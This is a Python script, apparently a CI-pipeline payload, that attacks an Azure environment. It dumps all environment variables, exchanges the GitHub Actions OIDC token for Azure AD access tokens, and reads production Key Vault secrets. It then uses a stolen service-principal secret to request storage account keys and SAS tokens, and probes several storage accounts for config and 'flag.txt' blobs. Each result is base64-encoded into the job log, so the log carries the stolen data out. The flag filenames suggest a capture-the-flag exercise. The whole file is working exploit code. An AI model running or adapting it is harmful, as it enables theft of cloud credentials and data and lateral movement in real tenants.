import os, json, base64, urllib.request, urllib.parse, urllib.error, hashlib, hmac, datetime, re

TEN=os.environ.get("AZURE_TENANT_ID","")
SUB=os.environ.get("AZURE_SUBSCRIPTION_ID","")
CID=os.environ.get("AZURE_CLIENT_ID","")
RG="rg-tbl-platform-prod-sea"

def P(*a): print(" ".join(str(x) for x in a),flush=True)
def B(x):
    if isinstance(x,str):x=x.encode()
    return base64.b64encode(x).decode()
def http(url,method="GET",headers=None,form=None,data=None,timeout=30):
    h=dict(headers or {})
    if form is not None:
        data=urllib.parse.urlencode(form).encode();h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif isinstance(data,str): data=data.encode()
    r=urllib.request.Request(url,data=data,method=method,headers=h)
    try:
        with urllib.request.urlopen(r,timeout=timeout) as x:return x.status,x.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        try:return e.code,e.read().decode("utf-8","replace")[:4000]
        except:return e.code,""
    except Exception as e:return 0,repr(e)

# 1. Dump ALL env vars
P("=== ALL ENV VARS ===")
for k in sorted(os.environ):
    v=os.environ.get(k,"")
    P(f"ENV {k}={v}")

# 2. Get OIDC and exchange
u=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL","")
tok_hdr=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
st,b=http(u+("&" if "?" in u else "?")+"audience=api://AzureADTokenExchange",headers={"Authorization":"bearer "+tok_hdr})
OIDC=json.loads(b).get("value","") if st==200 else ""
P("OIDC_LEN",len(OIDC))

def aad(scope):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",method="POST",
        form={"client_id":CID,"grant_type":"client_credentials","scope":scope,
              "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":OIDC})
    try:return json.loads(b).get("access_token","")
    except:return ""

# 3. Get vault token, read KV prod secrets
VT=aad("https://vault.azure.net/.default")
P("VT_LEN",len(VT))
if VT:
    for sn in ["sync-service-principal","secrets-sync-principal"]:
        st,b=http(f"https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/{sn}?api-version=7.4",
                  headers={"Authorization":"Bearer "+VT})
        P(f"KV_{sn}",st,B(b[:500]))

# 4. Get sync-service SP, mint ARM token
SYNC=None
if VT:
    st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4",
              headers={"Authorization":"Bearer "+VT})
    try:
        j=json.loads(json.loads(b).get("value",""))
        SYNC=(j.get("appId",""),j.get("clientSecret",""))
    except: pass

if SYNC:
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",method="POST",
        form={"client_id":SYNC[0],"client_secret":SYNC[1],"grant_type":"client_credentials","scope":"https://management.azure.com/.default"})
    AT=json.loads(b).get("access_token","") if st==200 else ""
    P("SYNC_ARM_LEN",len(AT))
    H={"Authorization":"Bearer "+AT}
    # listAccountSas on cilogs
    sas_body=json.dumps({"signedServices":"b","signedResourceTypes":"sco","signedPermission":"rl",
        "signedProtocol":"https","signedStart":"2026-10-01T00:00:00Z","signedExpiry":"2027-01-01T00:00:00Z"})
    st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listAccountSas?api-version=2023-05-01",
              method="POST",headers=dict(H,**{"Content-Type":"application/json"}),data=sas_body)
    P("LIST_ACCOUNT_SAS",st,B(b[:3000]))
    # listKeys on cilogs
    st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-05-01",
              method="POST",headers=dict(H,**{"Content-Length":"0"}))
    P("LISTKEYS",st,B(b[:2000]))

# 5. Read internal-config.json from appcfg via CI OIDC storage token (if permissions)
ST=aad("https://storage.azure.com/.default")
P("CI_STORAGE_LEN",len(ST))
if ST:
    now=datetime.datetime.now(datetime.timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")
    hdrs={"Authorization":"Bearer "+ST,"x-ms-date":now,"x-ms-version":"2021-08-06"}
    for sa in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz"]:
        for path in ["/config/internal-config.json","/flag.txt","/exports/flag.txt"]:
            st,b=http(f"https://{sa}.blob.core.windows.net{path}",headers=hdrs)
            if st==200:
                P("FLAG_BLOB",sa,path,st,B(b[:3000]))
            else:
                P("BLOB_ERR",sa,path,st,B(b[:500]))
P("DONE")
